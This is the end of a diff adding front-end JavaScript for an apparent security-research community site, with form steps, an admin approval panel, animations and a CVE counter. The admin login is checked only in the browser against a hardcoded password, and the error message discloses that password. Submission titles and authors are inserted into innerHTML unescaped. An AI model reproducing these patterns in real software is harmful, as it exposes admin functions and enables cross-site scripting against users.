+function goStep(step){[0,1,2,3].forEach(function(i){var el=document.getElementById('fs'+i);if(el)el.classList.remove('on');});var target=document.getElementById('fs'+step);if(target)target.classList.add('on');curStep=step;updateDots();}
+function updateDots(){[0,1,2].forEach(function(i){var d=document.getElementById('d'+i);if(!d)return;d.className='sdot2';if(i<curStep)d.classList.add('done');else if(i===curStep)d.classList.add('on');});}
+function submitForm(){goStep(3);var dots=document.getElementById('stepDots');if(dots)dots.style.display='none';}
+function resetForm(){var dots=document.getElementById('stepDots');if(dots)dots.style.display='flex';initUpload();}
+
+function checkAdmin(){var pass=document.getElementById('adminPass').value;if(pass==='admin2026'){document.getElementById('adminLogin').style.display='none';document.getElementById('adminDash').style.display='block';renderPendingList();}else{document.getElementById('adminPass').style.borderColor='var(--red)';document.getElementById('adminPass').value='';document.getElementById('adminPass').placeholder='Wrong password. Try: admin2026';}}
+function renderPendingList(){var list=document.getElementById('pendList');var html='';for(var i=0;i<PENDING_SUBS.length;i++){var s=PENDING_SUBS[i];html+='<div class="pend-c" id="pend-'+s.id+'"><span class="pend-b">'+s.type+'</span><div><div class="pend-ttl">'+s.title+'</div><div class="pend-auth">by '+s.author+' - '+s.date+'</div></div><button class="apr-btn" onclick="approveS(\''+s.id+'\')">&#9989; Approve</button><button class="rej-btn" onclick="rejectS(\''+s.id+'\')">&#10060; Reject</button></div>';}list.innerHTML=html||'<p style="color:var(--text3);">No pending submissions.</p>';}
+function approveS(id){var el=document.getElementById('pend-'+id);if(!el)return;el.style.opacity='0.5';el.querySelector('.apr-btn').textContent='Approved';el.querySelector('.apr-btn').disabled=true;el.querySelector('.rej-btn').style.display='none';var cnt=document.getElementById('pendCnt');cnt.textContent=Math.max(0,parseInt(cnt.textContent)-1);}
+function rejectS(id){var el=document.getElementById('pend-'+id);if(el)el.remove();var cnt=document.getElementById('pendCnt');cnt.textContent=Math.max(0,parseInt(cnt.textContent)-1);}
+function swAdminTab(tab,btn){document.querySelectorAll('.atab').forEach(function(b){b.classList.remove('on');});document.querySelectorAll('.atab-body').forEach(function(c){c.classList.remove('on');});btn.classList.add('on');var t=document.getElementById('atab-'+tab);if(t)t.classList.add('on');}
+
+function toggleNav(){document.getElementById('navLinks').classList.toggle('open');}
+function escH(str){if(!str)return '';return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+
+(function(){var phrases=['Bug Bounty Hunters','Security Researchers','Ethical Hackers','CTF Players','Security Students','Penetration Testers'];var el=document.getElementById('typeLine');if(!el)return;var pi=0,ci=0,deleting=false;function tick(){var phrase='> FOR '+phrases[pi];if(!deleting){el.textContent=phrase.substring(0,ci+1);ci++;if(ci===phrase.length){deleting=true;setTimeout(tick,1800);return;}}else{el.textContent=phrase.substring(0,ci-1);ci--;if(ci===0){deleting=false;pi=(pi+1)%phrases.length;}}setTimeout(tick,deleting?38:78);}tick();})();
+
+(function(){var hero=document.getElementById('hero');if(!hero)return;var colors=['#00d4ff','#ff2d78','#a855f7','#7fff00'];for(var i=0;i<12;i++){var p=document.createElement('div');p.className='particle';var size=Math.random()*4+2;p.style.cssText='width:'+size+'px;height:'+size+'px;left:'+(Math.random()*100)+'%;background:'+colors[Math.floor(Math.random()*colors.length)]+';animation-duration:'+(10+Math.random()*20)+'s;animation-delay:'+(Math.random()*10)+'s;';hero.appendChild(p);}})();
+
+(function(){var cards=document.querySelectorAll('.c-card');if(!window.IntersectionObserver)return;var obs=new IntersectionObserver(function(entries){entries.forEach(function(entry,i){if(entry.isIntersecting){setTimeout(function(){entry.target.style.opacity='1';entry.target.style.transform='translateY(0)';},i*80);obs.unobserve(entry.target);}});},{threshold:0.1});cards.forEach(function(c){c.style.opacity='0';c.style.transform='translateY(20px)';c.style.transition='opacity 0.5s ease, transform 0.5s ease';obs.observe(c);});})();
+
+document.getElementById('cveStatNum').textContent=CVES.length+'+';
+</script>
+</body>
+</html>
